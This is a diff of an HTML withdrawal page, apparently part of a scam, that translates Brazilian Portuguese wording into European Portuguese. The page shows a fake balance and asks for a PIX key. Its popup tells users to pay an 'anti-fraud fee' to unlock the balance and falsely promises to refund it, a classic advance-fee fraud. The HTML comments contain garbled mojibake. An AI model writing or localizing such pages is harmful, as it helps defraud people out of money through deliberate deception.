@@ -334,7 +334,7 @@ limite diario!</p>
 <span id="valor-money" style="font-size: 45px; text-align: center; font-family: 'Montserrat', sans-serif; letter-spacing: -2px; color: #06B32E;">R$ 67.00</span></div>
 </div>
 
-<p style="margin-bottom: 18px; margin-top: 23px; color: rgb(101, 101, 101); text-align: center; font-weight: bold;">Selecione seu tipo de chave PIX</p>
+<p style="margin-bottom: 18px; margin-top: 23px; color: rgb(101, 101, 101); text-align: center; font-weight: bold;">Selecione como deseja Receber</p>
 
 <div class="button-container"><button class="square-button" onclick="toggleButton(1)"><img alt="Botao 1" decoding="async" src="images/cpf.png"></button><button class="square-button" onclick="toggleButton(2)"><img alt="Botao 2" decoding="async" src="images/telefone.png"></button><button class="square-button" onclick="toggleButton(3)"><img alt="Botao 3" decoding="async" src="images/email.png"></button><button class="square-button" onclick="toggleButton(4)"><img alt="Botao 4" decoding="async" src="images/qr.png"></button></div>
 
@@ -342,16 +342,16 @@ limite diario!</p>
 <!--------------------- MENU EMBAIXO --------------------->
 
 <div class="menuemb"><!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" --><a href="#" onclick="mostrarPagina('saque')"><span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">paid</span> </a> <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" --> <a href="#" onclick="mostrarPagina('inicio')"> <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span> </a> <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" --> <a href="#" onclick="mostrarPagina('bonus')"> <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span> </a></div>
-<input class="form-input" id="chave-pix" name="chave-pix" placeholder="Digite sua chave PIX aqui" type="text"> <input class="form-input" id="quantia" inputmode="numeric" name="quantia" oninput="formatarValor(this)" placeholder="Digite o valor que deseja sacar" style="margin-top: 15px;" type="text"><button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;">REALIZAR SAQUE</button> <!--------------------- TAXA DESBLOQUEIO --------------------->
+<input class="form-input" id="chave-pix" name="chave-pix" placeholder="Digite sua chave PIX aqui" type="text"> <input class="form-input" id="quantia" inputmode="numeric" name="quantia" oninput="formatarValor(this)" placeholder="Digite o valor que deseja levantar" style="margin-top: 15px;" type="text"><button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;">REALIZAR LEVANTAMENTO</button> <!--------------------- TAXA DESBLOQUEIO --------------------->
 
 <div class="popup-container" id="popup">      <script src="js/lottie-player.js"></script><lottie-player src="https://lottie.host/7c73a00c-afa8-4ad5-b6b7-d8050e57f0c3/pg6N0GhPE7.json" background="##ffffff" speed="1.25" style="width: 150px; height: 150px; margin: 0 auto; display: flex;" loop="" autoplay="" direction="1" mode="normal"></lottie-player>
  <!--<span class="popup-text" style="font-size: 20px; font-weight: bold;">APRENDA A DESBLOQUEAR<br>SEU SALDO EM 1 MINUTO</span>---> <span class="popup-text" style="font-size: 20px; font-weight: bold;">DESBLOQUEAR SEU SALDO</span>
 
 <div style="margin-bottom: 20px;"></div>
 
-<p class="popup-text" style="padding-left: 5%; padding-right: 5%; text-align: justify;">Usamos uma taxa anti-fraudes, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro do sistema.<br>
+<p class="popup-text" style="padding-left: 5%; padding-right: 5%; text-align: justify;">Usamos uma taxa anti-fraudes, para evitar fraudes e abuso dos levantamentos que estavam ocorrendo dentro do sistema.<br>
 <br>
-Fique tranquilo, voce recebera o valor da taxa de volta junto ao valor do seu saque, e apenas uma etapa de validamento de que voce seria um humano e nao um robo.</p>
+Fique tranquilo, voce recebera o valor da taxa de volta junto ao valor do seu levantamento, e apenas uma etapa de validamento de que voce seria um humano e nao um robo.</p>
 
 <div style="margin-bottom: 20px;"></div>
 <button class="desbloquear-button" style="font-weight: bold;" onclick="window.open('saque')">DESBLOQUEAR AGORA</button></div>
